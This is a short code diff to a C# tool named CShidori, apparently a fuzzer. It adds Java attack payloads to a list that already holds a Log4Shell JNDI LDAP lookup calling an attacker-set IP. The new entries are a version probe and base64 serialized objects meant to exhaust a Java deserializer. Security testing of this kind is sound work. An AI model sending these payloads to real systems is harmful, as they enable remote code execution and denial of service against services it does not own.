@@ -111,7 +111,10 @@ namespace CShidori
 
 
             String[] java = new string[] {
-            "${jndi:ldap://"+ip+"/a}",
+            "${jndi:ldap://"+ip+"/a}", "${java:version}", //log4Shell
+            "rO0ABX1////3",  // ObjectInputStream DoS
+            "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=", //Nested Object[] (44 bytes):
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=", //Nested ArrayList (67 bytes):
 
             };
             results.AddRange(java);
